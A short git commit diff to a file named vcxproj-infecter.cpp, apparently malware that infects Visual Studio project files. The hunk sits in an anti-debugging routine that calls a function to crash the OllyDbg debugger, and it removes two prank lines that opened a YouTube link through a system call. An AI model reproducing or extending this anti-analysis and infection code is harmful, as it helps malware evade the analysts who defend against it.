6a867ba14615b9560ce6925eaaf077407c9e86c0
anas <60795188+ZeroM3m0ry@users.noreply.github.com>
2021-09-13 11:49:53 +0100

    Update vcxproj-infecter.cpp

--- vcxproj-infecter/vcxproj-infecter.cpp
+++ vcxproj-infecter/vcxproj-infecter.cpp
@@ -127,9 +127,6 @@ bool  AntiDebug() // anti debug
         // -- Other ----------------------------------------------------------
         // -------------------------------------------------------------------
         adbg_CrashOllyDbg();
-        string site = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-        system(std::string("start " + site).c_str());
-        
     }
 }
 
